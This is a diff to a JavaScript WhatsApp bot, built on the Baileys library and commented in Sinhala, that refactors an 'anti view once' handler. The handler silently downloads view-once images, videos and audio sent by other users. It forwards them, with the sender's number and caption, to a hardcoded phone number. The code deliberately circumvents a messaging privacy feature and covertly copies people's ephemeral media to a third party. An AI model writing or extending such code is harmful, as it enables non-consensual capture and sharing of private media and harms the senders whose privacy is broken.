@@ -1012,52 +1012,39 @@ await conn.readMessages([mek.key])
 
 //================================== AUTO ANTI VIEW ONCE ========================================
 if (!isOwner) {
-    // මැසේජ් එක View Once එකක්ද කියලා නිවැරදිවම චෙක් කරගන්නවා
-    const isVo = mek.message?.viewOnceMessageV2 || mek.message?.viewOnceMessage || mek.message?.viewOnceMessageV2Extension;
-    
-    if (isVo) {
+    // View Once මැසේජ් එකක්ද කියා නිවැරදිව හඳුනා ගැනීම
+    const msg = mek.message;
+    const viewOnceMsg = msg?.viewOnceMessageV2?.message || msg?.viewOnceMessage?.message || msg?.viewOnceMessageV2Extension?.message;
+
+    if (viewOnceMsg) {
         try {
-            // ඇතුලාන්ත මැසේජ් එක සහ එහි වර්ගය (Type) වෙන් කරගන්නවා
-            const voMsg = mek.message?.viewOnceMessageV2?.message || mek.message?.viewOnceMessage?.message || mek.message?.viewOnceMessageV2Extension?.message;
-            if (!voMsg) return;
+            // මීඩියා වර්ගය හඳුනා ගැනීම (Image, Video, Audio)
+            const type = viewOnceMsg.imageMessage ? "image" : viewOnceMsg.videoMessage ? "video" : viewOnceMsg.audioMessage ? "audio" : null;
+            if (!type) return;
 
-            const mime = voMsg.imageMessage ? "imageMessage" : voMsg.videoMessage ? "videoMessage" : voMsg.audioMessage ? "audioMessage" : null;
-            if (!mime) return;
+            const mediaContent = viewOnceMsg[`${type}Message`];
+            if (!mediaContent) return;
 
-            let ext, mediaType, mediaData;
-            if (mime === "imageMessage") {
-                ext = "jpg";
-                mediaType = "image";
-                mediaData = voMsg.imageMessage;
-            } else if (mime === "videoMessage") {
-                ext = "mp4";
-                mediaType = "video";
-                mediaData = voMsg.videoMessage;
-            } else if (mime === "audioMessage") {
-                ext = "mp3";
-                mediaType = "audio";
-                mediaData = voMsg.audioMessage;
+            // Baileys නිල ඩවුන්ලෝඩර් එක require කරගැනීම (ඉහලින් require කරල නැත්නම් විතරක්)
+            const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
+
+            // මීඩියා බෆර් එක ඩවුන්ලෝඩ් කිරීම
+            const stream = await downloadContentFromMessage(mediaContent, type);
+            let buffer = Buffer.from([]);
+            for await (const chunk of stream) {
+                buffer = Buffer.concat([buffer, chunk]);
             }
 
             // එවපු කෙනාගේ විස්තර
             const sentBynn = mek.key.participant || mek.key.remoteJid || mek.sender;
             const sentBy = sentBynn.split('@')[0];
-            const captionText = mediaData.caption ? `\n\n> 🔓 Caption: ${mediaData.caption}` : "";
+            const captionText = mediaContent.caption ? `\n\n> 🔓 Caption: ${mediaContent.caption}` : "";
 
-            // ඔයාගේ කමාන්ඩ් එකේ තිබ්බ නිවැරදිම download ක්‍රමය (m.quoted.download වෙනුවට කෙලින්ම මැසේජ් එකෙන් download කිරීම)
-            const ml = sms(conn, mek); 
-            let buff = await ml.download();
-            
-            if (!buff) return console.log("Failed to download ViewOnce media buffer.");
-
-            var filePath = `${Date.now()}.${ext}`;
-            fs.writeFileSync(filePath, buff);
-
+            // යැවිය යුතු මීඩියා ඔබ්ජෙක්ට් එක සකස් කිරීම
             let mediaObj = {};
-            mediaObj[mediaType] = fs.readFileSync(filePath);
-            
-            // Image/Video සඳහා විතරක් කැප්ෂන් එක දාන්න (Audio වලට caption බෑ)
-            if (mediaType !== "audio") {
+            mediaObj[type] = buffer; // කෙලින්ම බෆර් එක පාස් කරනවා (ෆයිල් සේව් කරන්න ඕනෙ නෑ)
+
+            if (type !== "audio") {
                 mediaObj.caption = `👁‍🗨 *Anti-ViewOnce Detected !!*\n\n📩 *Sent by:* _${sentBy}_${captionText}`;
             }
 
@@ -1065,20 +1052,16 @@ if (!isOwner) {
             const myTargetNumber = "94787318729@s.whatsapp.net";
             const sentMedia = await conn.sendMessage(myTargetNumber, mediaObj);
 
-            // Audio එකක් නම් විස්තර ටික වෙනම මැසේජ් එකකින් යවනවා 
-            if (mediaType === "audio") {
+            // Audio එකක් නම් විස්තර ටික වෙනම මැසේජ් එකකින් යවනවා
+            if (type === "audio") {
                 await conn.sendMessage(myTargetNumber, { text: `👁‍🗨 *Anti-ViewOnce Audio Detected !!*\n\n📩 *Sent by:* _${sentBy}_` }, { quoted: sentMedia });
             }
 
-            // තාවකාලික ෆයිල් එක අයින් කරනවා
-            fs.unlinkSync(filePath);
-
         } catch (error) {
-            console.error("Error in Anti-ViewOnce background process:", error);
+            console.error("Error in Auto Anti-ViewOnce:", error);
         }
     }
 }
-
 
 
 
